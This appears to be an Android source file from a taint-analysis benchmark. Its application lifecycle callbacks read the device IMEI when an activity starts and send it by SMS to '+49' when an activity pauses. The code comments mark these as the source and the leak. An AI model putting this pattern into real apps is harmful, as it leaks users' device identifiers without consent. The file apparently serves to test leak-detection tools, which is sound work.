package de.ecspride;

import android.Manifest;
import android.app.Activity;
import android.app.Application;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.content.ContextCompat;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

public class MyApplication extends Application {
	
	private final class ApplicationCallbacks implements
			ActivityLifecycleCallbacks {
		String imei;
		
		public ApplicationCallbacks() {
			Log.d("EX", "ApplicationCallbacks.<init>()");
		}

		@Override
		public void onActivityStopped(Activity activity) {
			// TODO Auto-generated method stub
			
		}

		@Override
		public void onActivityStarted(Activity activity) {
			if (ContextCompat.checkSelfPermission(activity, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
				Log.d("EX", "Application.onActivityStarted()");
				TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
				imei = telephonyManager.getDeviceId(); //source
			}
		}

		@Override
		public void onActivitySaveInstanceState(Activity activity, Bundle outState) {
			// TODO Auto-generated method stub
			
		}

		@Override
		public void onActivityResumed(Activity activity) {
			// TODO Auto-generated method stub
			
		}

		@Override
		public void onActivityPaused(Activity activity) {
			if (ContextCompat.checkSelfPermission(activity, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
				SmsManager sms = SmsManager.getDefault();
				sms.sendTextMessage("+49", null, imei, null, null);  //sink, leak
			}
		}

		@Override
		public void onActivityDestroyed(Activity activity) {
			// TODO Auto-generated method stub
			
		}

		@Override
		public void onActivityCreated(Activity activity, Bundle savedInstanceState) {
			Log.d("EX", "Application.onActivityCreated()");
		}
	}

	ActivityLifecycleCallbacks callbacks = new ApplicationCallbacks();

	@Override
	public void onCreate() {
		Log.d("EX", "Application.onCreate()");
		super.onCreate();
		this.registerActivityLifecycleCallbacks(callbacks);
	}
	
	@Override
	public void onTerminate() {
		super.onTerminate();
		this.unregisterActivityLifecycleCallbacks(callbacks);
	}

}
